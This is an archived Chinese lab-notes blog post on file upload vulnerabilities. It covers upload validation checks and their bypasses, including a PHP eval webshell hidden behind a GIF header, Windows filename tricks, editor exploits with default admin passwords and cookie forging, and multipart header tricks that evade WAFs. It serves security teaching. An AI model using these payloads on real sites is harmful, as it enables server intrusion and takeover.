---
title: "File Upload Security: Validation and Parser Differences"
title_zh: "文件上传安全：校验、解析与差异"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: File Upload Vulnerabilities
date: 2020-07-16 16:54:00
slug: File-Upload-Vulnerabilities
permalink: writing/File-Upload-Vulnerabilities/
topic: Application security
summary: "Examining content checks, extensions, naming rules and multipart parsing across upload paths."
summary_zh: "从上传报文结构出发，分类梳理客户端、服务端与WAF校验，讨论文件内容、扩展名、系统命名和多段请求解析之间的差异，连接上传与文件包含等问题。"
format_label: Lab notes
featured_rank: 0
missing_images: 3
withheld_images: 0
recovered_images: 0
tags: Vulnerabilities
---

## 概念

程序员由于没有对上传的文件进行严格限定，导致黑客可以通过工具上传其他格式的程序文件（比如：webshell），这样黑客就会拿到一个可执行环境，在服务器上搞破坏。



## upload-labs思维导图

![历史配图暂缺](redacted-image:missing)



## 请求包描述

```http
POST /upload.php HTTP/1.1
Host: localhost
Content-Length: 274
Cache-Control: max-age=0
Origin: http://localhost
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuKS18BporicXJfTx
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,de;q=0.6,en;q=0.4,fr;q=0.2
Connection: close

------WebKitFormBoundaryuKS18BporicXJfTx
Content-Disposition: form-data; name="file_x"; filename="xx.php"
```

**请求Header中Content-Type存在以下特征：**

- multipart/form-data（表示该请求是一个文件上传请求）
- 存在boundary字符串（作用为分隔符，以区分POST数据）



**POST的内容存在以下特征：**

- Content-Disposition
- name
- filename
- POST中的boundary的值就是Content-Type的值在最前面加了两个--，除了最后标识结束的boundary



## 文件上传校验姿势

### 三大校验简述

**1、客户端javascript校验（一般只校验后缀名）**

- 一般都是用javascript脚本检验上传文件的后缀



**2、服务端校验**

- 文件头content-type字段校验（image/gif）
- 文件内容头校验（GIF89a）
- 后缀名黑名单校验
- 后缀名白名单校验
- 自定义正则校验



**3、WAF设备校验（根据不同的WAF产品而定）**

### 服务端校验

******

### content-type字段校验

模拟web服务器端的校验代码

```php
<?php
if($_FILES['userfile']['type'] != "image/gif")  
#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。
{   
    echo "Sorry, we only allow uploading GIF images";
    exit;
}
$uploaddir = 'uploads/';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile))
{
echo "File is valid, and was successfully uploaded.\n";
}
else 
{
   echo "File uploading failed.\n";
}
?>
```

代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。

### 文件头校验

主要是检测文件内容开始处的文件幻数

```php
（1） .JPEG;.JPE;.JPG，”JPGGraphic File”
（2） .gif，”GIF 89A”
（3） .zip，”Zip Compressed”
（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”
```

### 文件内容检测

图像文件相关信息检测常用的就是`getimagesize()`函数，需要把文件头部分伪造好，就是在幻数的基础上还加了一些文件信息。

```php
GIF89a
(...some binary data for image...)
<?php phpinfo(); ?>
(... skipping the rest of binary data ...)
```

### 文件加载检测

一般是调用API函数去进行文件加载测试，常见的是图像渲染测试，再变态点的是进行二次渲染。
对渲染/加载测试的攻击方式是代码注入绕过；对二次渲染的攻击方式是攻击文件加载器自身。

二次渲染：相当于是把原本属于图像数据的部分抓了出来，再用自己的API或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。

## 文件上传绕过校验姿势

### 客户端绕过

禁用JS，或者用Burp抓包改包。

### 服务端绕过

******

### 文件类型绕过

抓包改Content-type字段。

### 文件头绕过

在木马内容基础上再加了一些文件信息

```php
GIF89a<?php eval($_POST['test']); ?>
```

### 文件后缀名绕过

**前提：黑名单校验
黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。**
绕过方法：

- 找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类
- 可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类



```php
能被解析的文件扩展名列表：
jsp jspx jspf
asp asa cer aspx
php php php3 php4
exe exee
```



## 配合文件包含漏洞

**前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。**
**绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）**

- 先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；
- 然后再上传一个.php的文件，内容为
  这个php文件就会去引用txt文件的内容，从而绕过校验.



下面列举包含的语法：

```php
#PHP    
<?php Include("上传的txt文件路径");?> 
#ASP    
<!--#include file="上传的txt文件路径" -->
#JSP    
<jsp:inclde page="上传的txt文件路径"/>
or  
<%@include file="上传的txt文件路径"%>
```

## 配合服务器解析漏洞

见[文件解析漏洞](/writing/File-Parsing-Vulnerabilities/)

## 配合操作系统文件命令规则

- 上传不符合windows文件命名规则的文件名



```php
test.asp.
test.asp(空格)
test.php:1.jpg
test.php::$DATA
shell.php::$DATA…….
```

会被windows系统自动去掉不符合规则符号后面的内容。

-  linux下后缀名大小写



## CMS、编辑器漏洞

### fckeditor

fckeditor编辑器页/查看编辑器版本/查看文件上传路径

1，fckeditor编辑器页
`FCKeditor/_samples/default.html`
2, 查看编辑器版本
`FCKeditor/_whatsnew.html`
3, 查看文件上传路径
`fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFile&Type=image&CurrentFolder=/`

`FCKeditor`编辑器漏洞的利用：

一般借助文件上传拿shell，像 <2.4.x版本（也就是2.4.x及以下）

的File参数时为黑名单验证，可以通过上

传``.asa、.cer、.asp;jpg（针对IIS6，及文件解析漏洞）``。如果``asa、cer``不被解析，还可以传``.asp[空格]``。传的方法就是抓包然后

在数据包里的文件名后填个空格；高版本的像2.6.3版本存在%00

截断的，具体方法是:找到上传界面，上传图片马后，抓包修改，

在post url请求头最后面加上`xxx.php（或asp ）%00 `上传成功后

会自动将文件名截断，上传后的文件名就改成了``xxx.php（或asp）``。

绕过`asp;.jpg`变`asp_jpg;`

有时服务器会把;.转义为_ ， 绕过的方法有很多，比如利用畸形文件名：``a.aspx.a;a.aspx.jpg…jpg.aspx
xx.asp.;.jpg`

### ewededtior

`ewededitor` 利用

- 1,默认后台地址:`/ewebeditor/admin_login.asp`

- 2,检测`admin_style.asp`文件是否可以直接访问
- 3,默认数据库路径：`[path]/db/ewebeditor.mdb`
- 4,某些cms 是`[path]/db/db.mdb`
- 5,使用默认密码:`admin/admin888 `或`admin/admin` 进入后台，也可以尝试 `admin/123456`（有些管理员以及一些cms就是这么设置的）



渗透的一般步骤：
找后台
`admin_style.asp`
`admin/admin.asp`
进后台
1，使用默认密码（使用一些弱口令）
2，下载`mdb`数据库（找到路径进入后下载）
3，burp 爆破
4，注入（找注入点用SQLmap跑）

如果以上方法都失败了，还是有机会不进入后台拿shell的：

利用`ewebeditor 5.2` 列目录漏洞
`ewebeditor/asp/browser.asp`
过滤不严，造成遍历目录漏洞，比如
`http:// target.example.com/ ewededitor/ asp/ browse.asp? style=standard650&dir=…/…/…`
利用`webeditor session`欺骗漏洞，进入后台。注意`…/`是返回上级目录的意思
拿到目录后找到数据库文件夹，能看到它的绝对路径访问下，下载下来就可以拿下这个网站了。
利用`ewebeditor PHP/ASP…`后台通杀漏洞（其实就是cookie欺骗）
影响版本：PHP>= 3.0-3.8与asp2.8版也通用
攻击利用：
进入后台`/ewebeditor/admin/login.php`，随便输入一个用户和密码，会提示出错了，这时你清空浏览器的`url`，然后输入

`Javascript:alert(document.cookie="adminuser="+escape("admin"));
Javascript:alert(document.cookie="adminpass="+escape("admin"));
JavaScript:alert(document.cookie="admindj="+escape("1"));`
而后三次回车，清空浏览器的`url`，就可以输入一些平常访问不到的文件比如：`…/ewebeditor/admin/default.php`，就会直接进去访问。

### 其他类型编辑器漏洞

`ckfinder`编辑器漏洞，
找到`ckfinder`目录下的`CKFinder.html`，上传点就在这里.
任意文件上传，然后利用IIS6.0文件解析漏洞，即可拿shell。
`UEDITOR `编辑器漏洞
利用IIS6.0文件名解析漏洞，上传图片改名为`x.php;20190032342342.jpg `获取shell
PHPWEB网站管理系统后台`kedit`编辑器漏洞
两种利用方式
第一种是利用IIS6.0文件解析漏洞
`xxx.php;xx.jpg`
第二种方式
%00截断
`xx.php%00jpg`
等等
大部分编辑器漏洞都是配合文件解析漏洞拿shell

## 配合0x00截断

不做过多叙述

## WAF Bypass

### WAF如何拦截

- 解析文件名，判断是否在黑名单内。
- 解析文件内容，判断是否为webshell。
- 文件目录权限



**目前，市面上常见的是解析文件名，少数WAF是解析文件内容，比如长亭。下面内容，都是基于文件名解析。**

### 垃圾数据

**有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。**

- 构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；![历史配图暂缺](redacted-image:missing)
- 将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验![历史配图暂缺](redacted-image:missing)
- 将垃圾数据加到Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。



### 多个filename

早期版本安全狗，可以多加一个filename

```http
Content-Disposition: form-data; name="file_x"; filename="test.txt"; filename="test.php"
```

**最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。**

### 交换name和filename的顺序

规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。

```http
Content-Disposition: form-data; filename="xx.php"; name=file_x
```

### 去掉引号,双引号变成单引号

```php
Content-Disposition: form-data; name=file_x; filename="xx.php"
Content-Disposition: form-data; name=file_x; filename=xx.php
Content-Disposition: form-data; name="file_x"; filename=xx.php

Content-Disposition: form-data; name='file_x'; filename='xx.php'
```

单引号、双引号、不要引号，都能上传。

### 大小写

对这三个固定的字符串进行大小写转换

- Content-Disposition
- name
- filename



### 空格

在``: ; =``添加1个或者多个空格。

### 去掉或修改Content-Disposition值

有的WAF在解析的时候，认为`Content-Disposition`值一定是`form-data`，造成绕过。

```http
Content-Disposition: name='file_x'; filename='xx.php'
```

### 多个boundary

最后上传的文件是`test.php`而非`test.txt`，但是取的文件名只取了第一个就会被Bypass。

```http
------WebKitFormBoundaryj1oRYFW91eaj8Ex2
Content-Disposition: form-data; name="file_x"; filename="test.txt"
Content-Type: text/javascript

------WebKitFormBoundaryj1oRYFW91eaj8Ex2
Content-Disposition: form-data; name="file_x"; filename="test.php"
Content-Type: text/javascript
```

### 多个分号

文件解析时，可能解析不到文件名，导致绕过。

```http
Content-Disposition: form-data; name="file_x";;; filename="test.php"
```

### Header在boundary前添加任意字符

PHP支持，JAVA报错

```http
Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2
```

### filename换行

PHP支持，Java不支持。

```http
Content-Disposition: form-data; name="file_x"; file
name="test.php"
```

### name和filename添加任意字符串

PHP支持，Java不支持。

```http
Content-Disposition: name="file_x"; bypass waf upload; filename="test.php";
```

### POST/GET

**有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。**
此种情况可以上传一个POST型的数据包，抓包将POST改为GET。
